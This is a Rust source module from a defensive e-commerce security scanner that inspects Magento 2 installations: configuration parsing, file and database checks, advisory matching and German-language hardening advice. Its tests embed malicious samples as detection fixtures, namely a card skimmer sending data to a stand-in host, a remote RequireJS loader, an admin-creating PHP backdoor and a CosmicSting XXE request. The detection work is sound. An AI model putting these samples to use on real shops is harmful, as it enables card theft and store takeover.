//! Magento 2 / Adobe Commerce adapter.
//!
//! * Detects a Magento 2 project root (`app/etc/env.php` plus `bin/magento`
//!   or a composer.json requiring `magento/product-*-edition` /
//!   `magento/magento2-base`).
//! * Parses `app/etc/env.php` with a tolerant PHP array parser (DB
//!   connection, table prefix, crypt key, `MAGE_MODE`, admin front name) and
//!   determines the version from `composer.lock` / `installed.json`
//!   (patch levels such as `2.4.6-p6` are compared correctly).
//! * File scan profile: `pub/` as public root, `pub/media`, `pub/static`
//!   and the transfer directories in `var/` must not contain code,
//!   `generated/` and the `var` caches are generated, `var/log` and
//!   `var/report` are logs, Knockout `html` templates are scanned as
//!   templates.
//! * File checks: entry points (pub/index.php, get.php, static.php,
//!   bootstrap.php), env.php code, storefront routes hijacking the admin
//!   path, RequireJS configurations with foreign URLs, module list with
//!   change detection, 2FA module, permissions.
//! * Database checks (SELECT only): admin users and sessions, integrations
//!   and OAuth tokens, base/static/media/admin URLs, head/footer scripts,
//!   payment configuration, CMS blocks/pages/widgets, template directives in
//!   customer data (CVE-2022-24086 traces), cron jobs without definition,
//!   setup_module vs. config.php.
//! * `--online`: all Composer packages are checked against OSV.dev.

mod config;
mod db_checks;
mod files;

pub use config::{parse_php_return, EnvConfig, PhpLit};

use config::Edition;
use ecomsec_core::finding::{Category, Finding, Severity, Source};
use ecomsec_core::platform::{
    Advisory, ComponentVersion, ConfigFileSpec, FileScanProfile, IntegrityItem, IntegrityReport,
    IntegrityStatus, PatchState, Platform, PlatformContext, PlatformInfo, PlatformKind,
};
use ecomsec_core::recommendations::{Recommendation, RecommendationGroupKind};
use ecomsec_core::report::Report;
use ecomsec_core::rules::RuleSet;
use ecomsec_core::version::Version;
use std::path::{Path, PathBuf};

pub const PLATFORM_ID: &str = "magento2";
pub const PLATFORM_NAME: &str = "Magento 2 / Adobe Commerce";
/// Advisory component for issues that only affect the commercial edition.
pub const COMPONENT_COMMERCE: &str = "Adobe Commerce";
pub const RULES_TOML: &str = include_str!("../signatures/rules_magento2.toml");
/// Embedded advisory file (`advisories/magento2.toml` in the repository).
pub const ADVISORIES_TOML: &str = include_str!("../advisories.toml");

/// Composer inventories of a Magento project (core, extensions, libraries).
pub const COMPOSER_INVENTORY: &[&str] = &["composer.lock", "vendor/composer/installed.json"];

pub struct Magento2 {
    root: PathBuf,
    env: EnvConfig,
    version: Option<Version>,
    version_source: String,
    edition: Edition,
    allow_hosts: Vec<String>,
}

impl Magento2 {
    pub fn detect(root: &Path) -> bool {
        if !root.join("app/etc/env.php").is_file() && !root.join("app/etc/config.php").is_file() {
            return false;
        }
        let composer = std::fs::read_to_string(root.join("composer.json"))
            .map(|t| {
                t.contains("magento/product-community-edition")
                    || t.contains("magento/product-enterprise-edition")
                    || t.contains("magento/magento2-base")
                    || t.contains("magento/magento-cloud-metapackage")
            })
            .unwrap_or(false);
        composer || root.join("bin/magento").is_file()
    }

    pub fn open(root: impl Into<PathBuf>) -> anyhow::Result<Self> {
        let root = root.into();
        let root = root.canonicalize().unwrap_or(root);
        let env = EnvConfig::load(&root);
        let (version, version_source, edition) = config::detect_version(&root);
        Ok(Magento2 {
            root,
            env,
            version,
            version_source,
            edition,
            allow_hosts: Vec::new(),
        })
    }

    /// Additional script hosts considered legitimate (`--allow-host`).
    pub fn with_allow_hosts(mut self, hosts: Vec<String>) -> Self {
        self.allow_hosts = hosts;
        self
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    pub fn env(&self) -> &EnvConfig {
        &self.env
    }
}

fn embedded_advisories() -> Vec<Advisory> {
    let mut db = ecomsec_core::AdvisoryDb::new();
    db.merge_toml("builtin:advisories/magento2.toml", ADVISORIES_TOML)
        .expect("embedded Magento advisories are valid");
    db.for_platform(PLATFORM_ID)
}

/// OSV.dev lookup of all Composer packages (only with `--online`).
fn dependency_check(root: &Path, ctx: &PlatformContext, report: &mut IntegrityReport) {
    if !ctx.online {
        report
            .items
            .push(ecomsec_osv::offline_item(root, COMPOSER_INVENTORY));
        return;
    }
    match ecomsec_osv::check_root(root, COMPOSER_INVENTORY, &ecomsec_osv::OsvClient::default()) {
        None => report
            .items
            .push(ecomsec_osv::offline_item(root, COMPOSER_INVENTORY)),
        Some(Ok(out)) => {
            report.findings.extend(out.findings);
            report.items.push(out.item);
            report.limitations.extend(out.limitations);
        }
        Some(Err(e)) => {
            report
                .limitations
                .push(format!("OSV-Abgleich fehlgeschlagen: {e}"));
            report
                .items
                .push(ecomsec_osv::offline_item(root, COMPOSER_INVENTORY));
        }
    }
}

impl Platform for Magento2 {
    fn info(&self) -> PlatformInfo {
        let mut details = vec![
            ("Edition".to_string(), self.edition.label().to_string()),
            ("Versionsquelle".to_string(), self.version_source.clone()),
        ];
        if let Some(m) = &self.env.mage_mode {
            details.push(("MAGE_MODE".into(), m.clone()));
        }
        if let Some(db) = &self.env.db {
            details.push(("Datenbank".into(), db.display()));
        }
        if !self.env.table_prefix.is_empty() {
            details.push(("Tabellenpräfix".into(), self.env.table_prefix.clone()));
        }
        PlatformInfo {
            id: PLATFORM_ID.into(),
            name: PLATFORM_NAME.into(),
            kind: PlatformKind::SelfHosted,
            version: self.version.clone(),
            root: Some(self.root.clone()),
            target: None,
            details,
        }
    }

    fn file_scan_profile(&self) -> Option<FileScanProfile> {
        let mut p = FileScanProfile::new(&self.root);
        p.public_root = Some(if self.env.document_root_is_pub == Some(false) {
            self.root.clone()
        } else {
            self.root.join("pub")
        });
        p.generated_dirs = vec![
            "generated".into(),
            "var/cache".into(),
            "var/page_cache".into(),
            "var/view_preprocessed".into(),
            "var/di".into(),
            "var/generation".into(),
            "var/composer_home".into(),
        ];
        // `var/` as a whole holds generated templates (view_preprocessed), so
        // only its transfer directories count as upload locations.
        p.upload_dirs = vec![
            "pub/media".into(),
            "pub/static".into(),
            "pub/opt".into(),
            "var/import".into(),
            "var/export".into(),
            "var/importexport".into(),
            "var/tmp".into(),
            "var/session".into(),
            "var/backups".into(),
        ];
        p.log_dirs = vec!["var/log".into(), "var/report".into(), "var/debug".into()];
        p.core_dirs = vec!["vendor/magento".into(), "app/code".into()];
        p.config_files = vec![
            ConfigFileSpec {
                path: "app/etc/env.php".into(),
                description: "Umgebungskonfiguration (DB-Zugang, Crypt-Key)".into(),
                secret: true,
            },
            ConfigFileSpec {
                path: "app/etc/config.php".into(),
                description: "Modulliste und Shop-Konfiguration".into(),
                secret: false,
            },
            ConfigFileSpec {
                path: "pub/.htaccess".into(),
                description: "Webserver-Konfiguration des Document Root".into(),
                secret: false,
            },
        ];
        // `.phtml` is classified as PHP; Knockout templates are `.html`.
        p.template_extensions = vec!["html".into()];
        Some(p)
    }

    fn rules(&self) -> RuleSet {
        RuleSet::from_toml("builtin:rules_magento2", RULES_TOML)
            .expect("embedded Magento rules compile")
    }

    fn advisories(&self) -> Vec<Advisory> {
        embedded_advisories()
    }

    /// `component = "Adobe Commerce"` marks advisories that only concern the
    /// commercial edition.  With an unknown edition the shop version is used
    /// (conservative).
    fn component_version(&self, component: &str) -> ComponentVersion {
        if !component.eq_ignore_ascii_case(COMPONENT_COMMERCE) {
            return ComponentVersion::Unknown;
        }
        match (self.edition, &self.version) {
            (Edition::OpenSource, _) => ComponentVersion::NotInstalled,
            (_, Some(v)) => ComponentVersion::Installed(v.clone()),
            (_, None) => ComponentVersion::Unknown,
        }
    }

    fn integrity(&self, ctx: &PlatformContext) -> anyhow::Result<IntegrityReport> {
        let mut report = IntegrityReport::default();
        report.items.push(
            IntegrityItem::new(
                "shop.version",
                "Shop",
                "Magento Version",
                if self.version.is_some() {
                    IntegrityStatus::Ok
                } else {
                    IntegrityStatus::Warning
                },
                self.version
                    .as_ref()
                    .map(|v| format!("{v} ({})", self.edition.label()))
                    .unwrap_or_else(|| "unbekannt".into()),
            )
            .with_detail(format!("Quelle: {}", self.version_source)),
        );
        files::env_php_checks(&self.root, &self.env, &mut report);
        files::entry_point_checks(&self.root, &mut report);
        files::admin_route_checks(&self.root, &self.env, &mut report);
        files::requirejs_checks(&self.root, &self.allow_hosts, &mut report);
        let modules = config::modules(&self.root);
        files::module_checks(&self.root, modules.as_deref(), ctx, &mut report);
        files::permission_checks(&self.root, &mut report);
        dependency_check(&self.root, ctx, &mut report);
        if ctx.skip_remote {
            report
                .limitations
                .push("Datenbankprüfungen übersprungen (--skip-remote).".into());
            return Ok(report);
        }
        match &self.env.db {
            None => {
                report.limitations.push(
                    "Keine Datenbankverbindung in app/etc/env.php gefunden – Admin-, Integrations-, \
                     Konfigurations- und CMS-Prüfungen übersprungen."
                        .into(),
                );
                report.findings.push(
                    Finding::new(
                        Severity::Info,
                        Category::ScanLimitation,
                        Source::Scanner,
                        "magento_db_config_missing",
                        "app/etc/env.php",
                        "Datenbankprüfungen nicht möglich: db/connection/default fehlt",
                    )
                    .with_description(
                        "app/etc/env.php ist nicht lesbar oder enthält keine Verbindung mit host/dbname/username.",
                    ),
                );
            }
            Some(creds) => match creds.connect() {
                Ok(mut conn) => {
                    let cron_jobs = files::known_cron_jobs(&self.root);
                    let enabled: Vec<String> = modules
                        .unwrap_or_default()
                        .into_iter()
                        .map(|(n, _)| n)
                        .collect();
                    db_checks::run(self, &cron_jobs, enabled, &mut conn, ctx, &mut report)
                }
                Err(e) => {
                    report
                        .limitations
                        .push(format!("Datenbank nicht erreichbar: {e}"));
                    report.findings.push(
                        Finding::new(
                            Severity::Info,
                            Category::ScanLimitation,
                            Source::Database,
                            "magento_db_unreachable",
                            creds.display(),
                            "Datenbank nicht erreichbar – DB-Prüfungen übersprungen",
                        )
                        .with_description(e.to_string()),
                    );
                }
            },
        }
        Ok(report)
    }

    fn recommendations(&self, report: &Report) -> Vec<Recommendation> {
        let mut recs = Vec::new();
        let open: Vec<&str> = report
            .advisories
            .iter()
            .filter(|a| matches!(a.state, PatchState::Vulnerable | PatchState::Unknown))
            .map(|a| a.advisory.id.as_str())
            .collect();
        if !open.is_empty() {
            recs.push(Recommendation::new(
                RecommendationGroupKind::Immediate,
                1,
                "Magento-Sicherheitspatch einspielen und Crypt-Key rotieren",
                format!(
                    "Offen: {}. Auf das aktuelle Patch-Release des eigenen Branches aktualisieren \
                     (`composer require magento/product-community-edition=2.4.x-pN --no-update && composer update`) \
                     oder den isolierten Adobe-Hotfix anwenden – ein Hotfix ändert die Versionsnummer nicht, \
                     daher nach dem Einspielen manuell als akzeptiert markieren. Danach Crypt-Key rotieren \
                     (System › Sonstige Einstellungen › Verschlüsselungsschlüssel bzw. \
                     `bin/magento encryption:key:change`), Admin-Passwörter und Integrations-Tokens erneuern.",
                    open.join(", ")
                ),
            ));
        }
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            2,
            "Admin-Zugang absichern",
            "Individuellen Admin-Pfad setzen, Magento_TwoFactorAuth aktiv lassen und für alle Admins \
             erzwingen, Admin-URL zusätzlich per IP-Allowlist/VPN schützen, ungenutzte Admin-Konten und \
             Integrationen löschen.",
        ));
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            3,
            "Production-Modus und Content Security Policy",
            "`MAGE_MODE=production` (`bin/magento deploy:mode:set production`), Document Root auf pub/, \
             app/etc/env.php mit Rechten 0440/0640. Magento_Csp im Checkout im Restrict-Modus betreiben \
             (Magento 2.4.7+: SRI und CSP für Zahlungsseiten, PCI DSS 4.0 Req. 6.4.3) und CSP-Reports \
             auswerten.",
        ));
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            3,
            "Regelmäßige Malware- und Patch-Überwachung",
            "Diesen Scan (mit `--online` für den OSV-Abgleich aller Composer-Pakete) per Cron laufen lassen \
             und zusätzlich einen spezialisierten Magento-Scanner wie Sansec eComscan einsetzen. Adobe \
             Security Bulletins (APSB) abonnieren und Patches innerhalb weniger Tage einspielen.",
        ));
        recs
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn advisories_use_patch_levels() {
        let advs = embedded_advisories();
        assert!(advs.len() >= 5);
        let cosmic = advs.iter().find(|a| a.id == "CVE-2024-34102").unwrap();
        let v = |s: &str| Version::parse(s).unwrap();
        assert!(cosmic.affects(&v("2.4.6-p5")));
        assert!(!cosmic.affects(&v("2.4.6-p6")));
        assert!(cosmic.affects(&v("2.4.7")));
        assert!(!cosmic.affects(&v("2.4.7-p1")));
        assert!(cosmic.affects(&v("2.4.4-p8")));
        assert!(cosmic.affects(&v("2.3.7-p4")));
        let reaper = advs.iter().find(|a| a.id == "CVE-2025-54236").unwrap();
        assert!(reaper.affects(&v("2.4.8-p2")));
        assert!(!reaper.affects(&v("2.4.8-p3")));
        assert!(!reaper.affects(&v("2.4.7-p8")));
    }

    #[test]
    fn rules_hit_samples() {
        let tmp = tempfile::tempdir().unwrap();
        let m = Magento2::open(tmp.path()).unwrap();
        let rules = m.rules();
        let names = |class: &str, data: &str| -> Vec<String> {
            rules
                .scan(class, data.as_bytes())
                .iter()
                .map(|h| h.rule.name().to_string())
                .collect()
        };
        assert!(names(
            "js",
            "document.addEventListener('submit',function(){var f=document.querySelector('#co-payment-form');var d=btoa(JSON.stringify({cc:document.getElementsByName('payment[cc_number]')[0].value}));new Image().src='https://magento-cdn.top/p.gif?'+d;});"
        )
        .contains(&"magento_payment_skimmer".to_string()));
        assert!(names(
            "js",
            "var config = { map: { '*': { 'checkout-loader': 'https://evil.top/l.js' } }, deps: ['//cdn-statics.xyz/a.js'] }; require.config(config);"
        )
        .contains(&"magento_requirejs_remote_dep".to_string()));
        assert!(names(
            "php",
            "<?php if(isset($_GET['sess'])){ $o = \\Magento\\Framework\\App\\ObjectManager::getInstance(); $u = $o->create('Magento\\User\\Model\\User'); $u->setData(['username'=>'sysadmin','is_active'=>1])->setRoleId(1)->save(); }"
        )
        .contains(&"magento_backdoor_admin_creation".to_string()));
        assert!(names("log", "POST /rest/V1/guest-carts/1/estimate-shipping-methods {\"address\":{\"totalsCollector\":{\"collectorList\":{\"totalCollector\":{\"sourceData\":{\"data\":\"<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \\\"http://x.top/dtd\\\">")
            .contains(&"magento_cosmicsting_xxe".to_string()));
        assert!(names(
            "template",
            "<!-- ko text: $t('Place Order') --><!-- /ko -->"
        )
        .is_empty());
    }
}
